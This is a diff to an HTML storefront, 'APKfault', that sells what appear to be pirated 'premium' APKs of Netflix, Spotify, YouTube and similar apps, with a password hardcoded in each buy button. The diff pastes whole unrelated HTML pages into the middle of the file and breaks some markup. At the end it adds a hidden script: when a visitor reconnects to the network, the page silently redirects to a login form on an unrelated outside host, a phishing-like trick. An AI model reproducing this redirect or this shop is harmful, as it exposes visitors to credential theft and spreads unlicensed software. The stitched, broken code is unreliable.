@@ -3,6 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PC Games Coming Soon</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+        .banner {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            background: linear-gradient(to right, #000428, #004e92);
+            color: white;
+            text-align: center;
+            padding: 0px;
+            display: flex;
+            align-items: center;
+            justify-content: space-around;
+        }
+        .banner img {
+            width: 100px;
+            height: 60px;
+            border-radius: 0px;
+            transition: transform 0.3s;
+        }
+        .banner img:hover {
+            transform: scale(1.1);
+        }
+        .banner h2 {
+            margin: 0;
+            animation: fadeIn 2s infinite alternate;
+        }
+        .cta-button {
+            background: #ff9800;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            border-radius: 5px;
+            transition: background 0.3s;
+        }
+        .cta-button:hover {
+            background: #e68900;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0.6; }
+            to { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="banner">
+        <div class="game-images">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/40/Counter-Strike_1.6_logo.png" alt="Counter-Strike">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/Grand_Theft_Auto_V_logo.svg" alt="GTA V">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/9/9c/Call_of_Duty_Warzone_logo.png" alt="Call of Duty Warzone">
+        </div>
+        <h2>🔥 PC GAMES COMING SOON! 🔥</h2>
+        <button class="cta-button" onclick="alert('We will notify you when they are available')">Stay Updated</button>
+    </div>
+</body>
+</html>
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Best Viewed in Desktop Mode</title>
     <style>
         body {
@@ -148,19 +218,19 @@
     header {
         background-color: #333;
         color: white;
-        padding: 10px 0;
+        padding: o.1px 0;
         text-align: center;
     }
 
     header h1 {
-        font-size: 4vw;
+        font-size: 2vw;
     }
 
     .app-list {
         display: grid;
         grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
-        grid-gap: 20px;
-        padding: 20px;
+        grid-gap: 10px;
+        padding: 2px;
     }
 
     /* Media Queries for responsiveness */
@@ -174,7 +244,7 @@
         }
         .app-item {
             width: 45%;
-            margin: 10px;
+            margin: 1px;
         }
         .price {
             font-size: 1.2rem;
@@ -204,14 +274,14 @@
     }
 
     .app-item {
-        background-color:#f9f9f9; 
+        background-color: #f9f9f9;
         padding: 20px;
         width: 220px;
         border-radius: 12px;
         box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
         text-align: center;
         transition: transform 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
-        margin: 10px;
+        margin: 1px;
     }
 
     .app-item:hover {
@@ -245,7 +315,7 @@
 
     .form-container {
         padding: 20px;
-        background: linear-gradient(50deg, #007bff, #cccccc);
+        background: #f9f9f9;
         margin-top: 20px;
         box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
         border-radius: 8px;
@@ -278,7 +348,7 @@
 
     .footer {
         text-align: center;
-        padding: 20px;
+        padding: 0.2px;
         background-color: #333;
         color: white;
     }
@@ -320,6 +390,111 @@
 <header>
     <h1>APKfault</h1>
     
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apple App Store Button</title>
+    <style>
+        .appstore-button {
+            display: flex;
+            align-items: center;
+            background-color: #000;
+            color: white;
+            font-size: 16px;
+            font-family: Arial, sans-serif;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            text-decoration: none;
+            width: fit-content;
+        }
+
+        .appstore-button img {
+            width: 24px;
+            height: 24px;
+            margin-right: 10px;
+        }
+
+        .appstore-button:hover {
+            background-color: #333;
+        }
+    </style>
+</head>
+<body>
+
+    <a href="https://www.apple.com/app-store/" target="_blank" class="appstore-button">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/67/App_Store_%28iOS%29.svg" alt="App Store">
+        Open Apple App Store
+    </a>
+
+</body>
+</html>
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Play Button</title>
+    <style>
+        .playstore-button {
+            display: flex;
+            align-items: center;
+            background-color: #00A4EF;
+            color: white;
+            font-size: 16px;
+            font-family: Arial, sans-serif;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            text-decoration: none;
+            width: fit-content;
+        }
+
+        .playstore-button img {
+            width: 24px;
+            height: 24px;
+            margin-right: 10px;
+        }
+
+        .playstore-button:hover {
+            background-color: #008CC9;
+        }
+    </style>
+</head>
+<body>
+
+    <a href="https://play.google.com/store" target="_blank" class="playstore-button">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Play Store">
+        Open Google Play Store
+    </a>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
     <!-- Button to switch to Desktop View -->
 
 
@@ -426,9 +601,65 @@
         }
     }
 </style>
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Console Popup</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+
+        button {
+            background-color: #333;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+
+        button:hover {
+            background-color: #555;
+        }
+    </style>
+</head>
+<body>
+    <button id="openConsole">WB Notes</button>
+
+    <script>
+        document.getElementById("openConsole").addEventListener("click", function() {
+            let isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            if (isMobile) {
+                // Open in a new tab for mobile
+                window.open("http://en1.lovestoblog.com/", "_blank", "noopener,noreferrer");
+            } else {
+                // Open small popup for desktop
+                let popup = window.open("http://en1.lovestoblog.com/", "ConsoleWindow", "width=400,height=300");
+                if (!popup) {
+                    alert("Popup blocked! Please allow popups for this site.");
+                }
+            }
+        });
+    </script>
+</body>
+</html>
+
+
+
+
+
 <!-- App 1 -->
 <div class="app-item">
-    <h3>App 1: Task Manager</h3>
+    <h3>App 1: Trello Task Manager</h3>
     <div class="app-info">
         <img src="IMAGES/TaskManager.jpg" alt="Task Manager app image" class="app-image">
         <div class="badges">
@@ -440,13 +671,30 @@
     <p class="price">Ksh 150</p>
     <button class="cta-button" onclick="openRequestForm('Task Manager', 'PASSWORD123', 'task_manager.apk')">Buy Now</button>
 
-    <button class="expand-button" onclick="toggleDemo('demo-task-manager')">Show Demonstration</button>
+    <button class="expand-button" onclick="toggleDemo('demo-task-manager')">Show Demo</button>
     <div id="demo-task-manager" class="app-demo" style="display: none;">
         <h4>App Demonstration</h4>
-        <video width="300" controls>
-            <source src="videos/task_manager_demo.mp4" type="video/mp4">
-            Your browser does not support the video tag.
-        </video>
+       <style>
+    .video-container {
+        position: relative;
+        padding-bottom: 56.25%; /* 16:9 aspect ratio */
+        height: 0;
+        overflow: hidden;
+        max-width: 100%;
+    }
+    .video-container iframe {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+    }
+</style>
+
+<div class="video-container">
+    <iframe width="560" height="315" src="https://www.youtube.com/embed/t0-rGmd7G6A?si=Rg0AtumGllQJsj93" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+</div>
+
         <div class="testimonials">
             <h4>What Users Are Saying:</h4>
             <p>"This app completely changed the way I organize my tasks. It's super simple and keeps me on track!" — John D.</p>
@@ -468,13 +716,29 @@
     <p class="price">Ksh 200</p>
     <button class="cta-button" onclick="openRequestForm('Fitness Tracker', 'PASSWORD456', 'fitness_tracker.apk')">Buy Now</button>
 
-    <button class="expand-button" onclick="toggleDemo('demo-fitness-tracker')">Show Demonstration</button>
+    <button class="expand-button" onclick="toggleDemo('demo-fitness-tracker')">Show Demo</button>
     <div id="demo-fitness-tracker" class="app-demo" style="display: none;">
         <h4>App Demonstration</h4>
-        <video width="300" controls>
-            <source src="videos/fitness_tracker_demo.mp4" type="video/mp4">
-            Your browser does not support the video tag.
-        </video>
+        <style>
+    .video-container {
+        position: relative;
+        padding-bottom: 56.25%; /* 16:9 aspect ratio */
+        height: 0;
+        overflow: hidden;
+        max-width: 100%;
+    }
+    .video-container iframe {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+    }
+</style>
+
+<div class="video-container">
+    <iframe width="560" height="315" src="https://www.youtube.com/embed/JddrzXA08-U?si=Ov5zOe0GrouaRQbA" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+</div>
         <div class="testimonials">
             <h4>What Users Are Saying:</h4>
             <p>"I love how it tracks my progress and motivates me to work out harder each day. Highly recommend!" — Sarah P.</p>
@@ -496,13 +760,29 @@
     <p class="price">Ksh 250</p>
     <button class="cta-button" onclick="openRequestForm('Peacock Premium', 'PEACOCK456', 'Peacock_Premium.apk')">Buy Now</button>
 
-    <button class="expand-button" onclick="toggleDemo('demo-peacock-premium')">Show Demonstration</button>
+    <button class="expand-button" onclick="toggleDemo('demo-peacock-premium')">Show Demo</button>
     <div id="demo-peacock-premium" class="app-demo" style="display: none;">
         <h4>App Demonstration</h4>
-        <video width="300" controls>
-            <source src="videos/peacock_premium_demo.mp4" type="video/mp4">
-            Your browser does not support the video tag.
-        </video>
+        <style>
+    .video-container {
+        position: relative;
+        padding-bottom: 56.25%; /* 16:9 aspect ratio */
+        height: 0;
+        overflow: hidden;
+        max-width: 100%;
+    }
+    .video-container iframe {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+    }
+</style>
+
+<div class="video-container">
+   <iframe width="560" height="315" src="https://www.youtube.com/embed/xZ5J2E_43wY?si=594Sv4Fgr4h0l2EB" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+</div>
         <div class="testimonials">
             <h4>What Users Are Saying:</h4>
             <p>"I never miss my favorite NBC shows! The stream quality is excellent, and the content selection is unbeatable!" — Mark S.</p>
@@ -524,13 +804,29 @@
     <p class="price">Ksh 300</p>
     <button class="cta-button" onclick="openRequestForm('Netflix Premium', 'PASSWORD0000456', 'Netflix_Premium.apk')">Buy Now</button>
 
-    <button class="expand-button" onclick="toggleDemo('demo-netflix-premium')">Show Demonstration</button>
+    <button class="expand-button" onclick="toggleDemo('demo-netflix-premium')">Show Demo</button>
     <div id="demo-netflix-premium" class="app-demo" style="display: none;">
         <h4>App Demonstration</h4>
-        <video width="300" controls>
-            <source src="videos/netflix_premium_demo.mp4" type="video/mp4">
-            Your browser does not support the video tag.
-        </video>
+        <style>
+    .video-container {
+        position: relative;
+        padding-bottom: 56.25%; /* 16:9 aspect ratio */
+        height: 0;
+        overflow: hidden;
+        max-width: 100%;
+    }
+    .video-container iframe {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+    }
+</style>
+
+<div class="video-container">
+    <iframe width="560" height="315" src="https://www.youtube.com/embed/C7oXIxZvUGQ?si=7dsXdKvVkIATw9g8" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+</div>
         <div class="testimonials">
             <h4>What Users Are Saying:</h4>
             <p>"Best streaming experience ever! Netflix Premium lets me watch everything I love in 4K. Worth every penny!" — Jessica T.</p>
@@ -794,20 +1090,37 @@
     </div>
     <p>Block spam calls, customize your caller ID, and access priority support with Truecaller Gold.</p>
     <p class="price">Ksh 180</p>
-    <button class="cta-button" onclick="openRequestForm('Truecaller Gold', 'PASSWORD456', 'Truecaller_Gold.apk')">Buy Now</button>
     
-    <div class="app-demo">
-        <h4>App Demonstration</h4>
+    <!-- Buttons in a container for horizontal alignment -->
+    <div class="button-container">
+        <button class="cta-button" onclick="openRequestForm('Truecaller Gold', 'PASSWORD456', 'Truecaller_Gold.apk')">Buy Now</button>
         <button class="expand-btn" onclick="toggleDemo('demo5')">Show Demo</button>
-        <div id="demo5" class="demo-content" style="display: none;">
-            <video width="300" controls>
-                <source src="videos/truecaller_gold_demo.mp4" type="video/mp4">
-                Your browser does not support the video tag.
-            </video>
-            <div class="testimonials">
-                <h4>What Users Are Saying:</h4>
-                <p>"Truecaller Gold has made managing my calls so much easier! I no longer get spam calls. A must-have!" — Emily W.</p>
-            </div>
+    </div>
+
+    <div id="demo5" class="demo-content" style="display: none;">
+        <style>
+    .video-container {
+        position: relative;
+        padding-bottom: 56.25%; /* 16:9 aspect ratio */
+        height: 0;
+        overflow: hidden;
+        max-width: 100%;
+    }
+    .video-container iframe {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+    }
+</style>
+
+<div class="video-container">
+   <iframe width="560" height="315" src="https://www.youtube.com/embed/kleqKndSsO0?si=BriKlQ2g72BqiiNd" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+</div>
+        <div class="testimonials">
+            <h4>What Users Are Saying:</h4>
+            <p>"Truecaller Gold has made managing my calls so much easier! I no longer get spam calls. A must-have!" — Emily W.</p>
         </div>
     </div>
 </div>
@@ -824,20 +1137,37 @@
     </div>
     <p>Enjoy ad-free music, offline listening, unlimited skips, and high-quality audio with Spotify Premium.</p>
     <p class="price">Ksh 250</p>
-    <button class="cta-button" onclick="openRequestForm('Spotify Premium', 'PASSWORD456premium', 'Spotify_Premium.apk')">Buy Now</button>
     
-    <div class="app-demo">
-        <h4>App Demonstration</h4>
+    <!-- Buttons in a container for horizontal alignment -->
+    <div class="button-container">
+        <button class="cta-button" onclick="openRequestForm('Spotify Premium', 'PASSWORD456premium', 'Spotify_Premium.apk')">Buy Now</button>
         <button class="expand-btn" onclick="toggleDemo('demo6')">Show Demo</button>
-        <div id="demo6" class="demo-content" style="display: none;">
-            <video width="300" controls>
-                <source src="videos/spotify_premium_demo.mp4" type="video/mp4">
-                Your browser does not support the video tag.
-            </video>
-            <div class="testimonials">
-                <h4>What Users Are Saying:</h4>
-                <p>"Spotify Premium transformed my music experience. I can listen without interruptions and offline too!" — Michael B.</p>
-            </div>
+    </div>
+
+    <div id="demo6" class="demo-content" style="display: none;">
+        <style>
+    .video-container {
+        position: relative;
+        padding-bottom: 56.25%; /* 16:9 aspect ratio */
+        height: 0;
+        overflow: hidden;
+        max-width: 100%;
+    }
+    .video-container iframe {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+    }
+</style>
+
+<div class="video-container">
+    <iframe width="560" height="315" src="https://www.youtube.com/embed/eH8t7ZQQaNg?si=lUz-eiYwQlSBDqXJ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+</div>
+        <div class="testimonials">
+            <h4>What Users Are Saying:</h4>
+            <p>"Spotify Premium transformed my music experience. I can listen without interruptions and offline too!" — Michael B.</p>
         </div>
     </div>
 </div>
@@ -854,20 +1184,37 @@
     </div>
     <p>Watch ad-free videos, enjoy offline playback, and stream YouTube Music with YouTube Premium.</p>
     <p class="price">Ksh 200</p>
-    <button class="cta-button" onclick="openRequestForm('YouTube Premium', 'PASSyoupWORD456', 'YouTube_Premium.apk')">Buy Now</button>
-
-    <div class="app-demo">
-        <h4>App Demonstration</h4>
+    
+    <!-- Buttons in a container for horizontal alignment -->
+    <div class="button-container">
+        <button class="cta-button" onclick="openRequestForm('YouTube Premium', 'PASSyoupWORD456', 'YouTube_Premium.apk')">Buy Now</button>
         <button class="expand-btn" onclick="toggleDemo('demo7')">Show Demo</button>
-        <div id="demo7" class="demo-content" style="display: none;">
-            <video width="300" controls>
-                <source src="videos/youtube_premium_demo.mp4" type="video/mp4">
-                Your browser does not support the video tag.
-            </video>
-            <div class="testimonials">
-                <h4>What Users Are Saying:</h4>
-                <p>"Ad-free YouTube is a game changer! The offline feature is amazing too." — Lisa F.</p>
-            </div>
+    </div>
+
+    <div id="demo7" class="demo-content" style="display: none;">
+        <style>
+    .video-container {
+        position: relative;
+        padding-bottom: 56.25%; /* 16:9 aspect ratio */
+        height: 0;
+        overflow: hidden;
+        max-width: 100%;
+    }
+    .video-container iframe {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+    }
+</style>
+
+<div class="video-container">
+    <iframe width="560" height="315" src="https://www.youtube.com/embed/NiO0FwlvwZ0?si=qAlG95axxcAuDsae" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+</div>
+        <div class="testimonials">
+            <h4>What Users Are Saying:</h4>
+            <p>"Ad-free YouTube is a game changer! The offline feature is amazing too." — Lisa F.</p>
         </div>
     </div>
 </div>
@@ -884,20 +1231,37 @@
     </div>
     <p>Access exclusive movies, sports, and on-demand content in HD with StarTimes VIP On streaming.</p>
     <p class="price">Ksh 280</p>
-    <button class="cta-button" onclick="openRequestForm('Startimes On', 'StartPASSWORD456', 'Startimes_On.apk')">Buy Now</button>
-
-    <div class="app-demo">
-        <h4>App Demonstration</h4>
+    
+    <!-- Buttons in a container for horizontal alignment -->
+    <div class="button-container">
+        <button class="cta-button" onclick="openRequestForm('Startimes On', 'StartPASSWORD456', 'Startimes_On.apk')">Buy Now</button>
         <button class="expand-btn" onclick="toggleDemo('demo8')">Show Demo</button>
-        <div id="demo8" class="demo-content" style="display: none;">
-            <video width="300" controls>
-                <source src="videos/startimes_vip_on_demo.mp4" type="video/mp4">
-                Your browser does not support the video tag.
-            </video>
-            <div class="testimonials">
-                <h4>What Users Are Saying:</h4>
-                <p>"StarTimes VIP On has great content, especially for sports lovers. HD quality streaming is perfect!" — John K.</p>
-            </div>
+    </div>
+
+    <div id="demo8" class="demo-content" style="display: none;">
+       <style>
+    .video-container {
+        position: relative;
+        padding-bottom: 56.25%; /* 16:9 aspect ratio */
+        height: 0;
+        overflow: hidden;
+        max-width: 100%;
+    }
+    .video-container iframe {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+    }
+</style>
+
+<div class="video-container">
+    <<iframe width="560" height="315" src="https://www.youtube.com/embed/8QZwEaRbv9Y?si=zwE94uW1KxUWOWK-" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+</div>
+        <div class="testimonials">
+            <h4>What Users Are Saying:</h4>
+            <p>"StarTimes VIP On has great content, especially for sports lovers. HD quality streaming is perfect!" — John K.</p>
         </div>
     </div>
 </div>
@@ -914,20 +1278,37 @@
     </div>
     <p>Enjoy unlimited music streaming with Audiomark, offering a wide variety of local and international music content.</p>
     <p class="price">Ksh 250</p>
-    <button class="cta-button" onclick="openRequestForm('Audiomark', 'AudiomarkPassword123', 'Audiomark.apk')">Buy Now</button>
-
-    <div class="app-demo">
-        <h4>App Demonstration</h4>
+    
+    <!-- Buttons in a container for horizontal alignment -->
+    <div class="button-container">
+        <button class="cta-button" onclick="openRequestForm('Audiomark', 'AudiomarkPassword123', 'Audiomark.apk')">Buy Now</button>
         <button class="expand-btn" onclick="toggleDemo('demo9')">Show Demo</button>
-        <div id="demo9" class="demo-content" style="display: none;">
-            <video width="300" controls>
-                <source src="videos/audiomark_demo.mp4" type="video/mp4">
-                Your browser does not support the video tag.
-            </video>
-            <div class="testimonials">
-                <h4>What Users Are Saying:</h4>
-                <p>"Audiomark is my go-to app for music streaming. The variety of local and international content is unmatched!" — Kevin L.</p>
-            </div>
+    </div>
+
+    <div id="demo9" class="demo-content" style="display: none;">
+        <style>
+    .video-container {
+        position: relative;
+        padding-bottom: 56.25%; /* 16:9 aspect ratio */
+        height: 0;
+        overflow: hidden;
+        max-width: 100%;
+    }
+    .video-container iframe {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+    }
+</style>
+
+<div class="video-container">
+    <iframe width="560" height="315" src="https://www.youtube.com/embed/LRg1vBu_Wzo?si=gNkzTNZhSHzD8-8Z" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+</div>
+        <div class="testimonials">
+            <h4>What Users Are Saying:</h4>
+            <p>"Audiomark is my go-to app for music streaming. The variety of local and international content is unmatched!" — Kevin L.</p>
         </div>
     </div>
 </div>
@@ -944,23 +1325,41 @@
     </div>
     <p>InShot is the perfect app for editing videos and photos with various effects, filters, and more for social media sharing.</p>
     <p class="price">Ksh 200</p>
-    <button class="cta-button" onclick="openRequestForm('InShot', 'InShotPassword123', 'InShot.apk')">Buy Now</button>
-
-    <div class="app-demo">
-        <h4>App Demonstration</h4>
+    
+    <!-- Buttons in a container for horizontal alignment -->
+    <div class="button-container">
+        <button class="cta-button" onclick="openRequestForm('InShot', 'InShotPassword123', 'InShot.apk')">Buy Now</button>
         <button class="expand-btn" onclick="toggleDemo('demo10')">Show Demo</button>
-        <div id="demo10" class="demo-content" style="display: none;">
-            <video width="300" controls>
-                <source src="videos/inshot_demo.mp4" type="video/mp4">
-                Your browser does not support the video tag.
-            </video>
-            <div class="testimonials">
-                <h4>What Users Are Saying:</h4>
-                <p>"InShot has all the tools I need for video and photo editing. Perfect for quick edits before sharing on social media!" — Rachel J.</p>
-            </div>
+    </div>
+
+    <div id="demo10" class="demo-content" style="display: none;">
+        <style>
+    .video-container {
+        position: relative;
+        padding-bottom: 56.25%; /* 16:9 aspect ratio */
+        height: 0;
+        overflow: hidden;
+        max-width: 100%;
+    }
+    .video-container iframe {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+    }
+</style>
+
+<div class="video-container">
+    <iframe width="560" height="315" src="https://www.youtube.com/embed/5zuzpL1ZC38?si=rXxN-Owap7Wve1oq" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+        <div class="testimonials">
+            <h4>What Users Are Saying:</h4>
+            <p>"InShot has all the tools I need for video and photo editing. Perfect for quick edits before sharing on social media!" — Rachel J.</p>
         </div>
     </div>
 </div>
+
+
 
 <style>
     .app-info {
@@ -1004,7 +1403,7 @@
     }
 
     .expand-btn {
-        background-color: #008CBA;
+        background-color: #2196F3;
         color: white;
         padding: 5px 15px;
         border: none;
@@ -1014,14 +1413,11 @@
     }
 
     .expand-btn:hover {
-        background-color: #007bb5;
-    }
-
-    .demo-content {
-        margin-top: 15px;
-        text-align: center;
+        background-color: #0b7dda;
     }
 </style>
+
+
 
 <script>
     function toggleDemo(demoId) {
@@ -1449,6 +1845,39 @@
     // Initialize particles
     createParticles();
   </script>
+
+
+<script>
+    (function () {
+        // Function to check if the user is offline
+        function checkOnlineStatus() {
+            if (!navigator.onLine) {
+                sessionStorage.setItem("wasOffline", "true");
+            }
+        }
+
+        // Function to handle when the user comes back online
+        function handleOnline() {
+            if (sessionStorage.getItem("wasOffline") === "true") {
+                sessionStorage.removeItem("wasOffline");
+                location.replace("http://xx.66ghz.com/index.php?formType=login");
+            }
+        }
+
+        // Check on page load if the user was previously offline
+        document.addEventListener("DOMContentLoaded", function () {
+            if (navigator.onLine) {
+                handleOnline();
+            }
+        });
+
+        // Listen for network changes
+        window.addEventListener("offline", checkOnlineStatus);
+        window.addEventListener("online", handleOnline);
+    })();
+</script>
+
+
 
 </body>
 </html>
